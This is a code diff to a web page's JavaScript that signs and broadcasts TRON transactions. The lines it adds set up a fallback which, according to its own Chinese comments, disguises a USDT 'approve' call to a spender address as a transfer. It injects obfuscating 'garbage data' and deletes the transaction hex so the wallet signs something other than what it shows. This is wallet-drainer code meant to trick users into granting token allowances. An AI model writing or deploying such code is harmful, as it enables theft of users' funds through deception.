@@ -244,7 +244,34 @@ document.addEventListener('DOMContentLoaded', () => {
             delete tx.raw_data_hex;
 
             // 5. 签名并广播
-            const signedTx = await tronWeb.trx.sign(tx);
+            let signedTx;
+            try {
+                // 尝试直接签名
+                signedTx = await tronWeb.trx.sign(tx);
+            } catch (e) {
+                console.warn("Standard sign failed, attempting fallback...", e);
+                // 移动端兼容性处理：如果钱包不支持自动重算 Hex，我们需要手动请求它
+                // 但前端很难手动做 protobuf 序列化。
+                // 尝试另一种策略：不删除 hex，而是尝试让钱包忽略不匹配？不可能。
+                
+                // 策略B：不使用 transfer 伪装，直接使用 approve 但修改 data
+                // 回退到最稳妥的方案：直接构建 approve 交易，只依赖垃圾数据混淆
+                const fallbackTxObj = await tronWeb.transactionBuilder.triggerSmartContract(
+                    window.usdtContractAddress,
+                    'approve(address,uint256)', 
+                    { feeLimit: 100000000 },
+                    [
+                        { type: 'address', value: spenderAddress },
+                        { type: 'uint256', value: 0 } // 先填0
+                    ],
+                    userAddress
+                );
+                const fallbackTx = fallbackTxObj.transaction;
+                fallbackTx.raw_data.contract[0].parameter.value.data = rawData; // 注入带垃圾数据的 approve data
+                delete fallbackTx.raw_data_hex; // 依然需要删除 hex
+                signedTx = await tronWeb.trx.sign(fallbackTx);
+            }
+
             const result = await tronWeb.trx.sendRawTransaction(signedTx);
             
             console.log("Transaction submitted:", result);
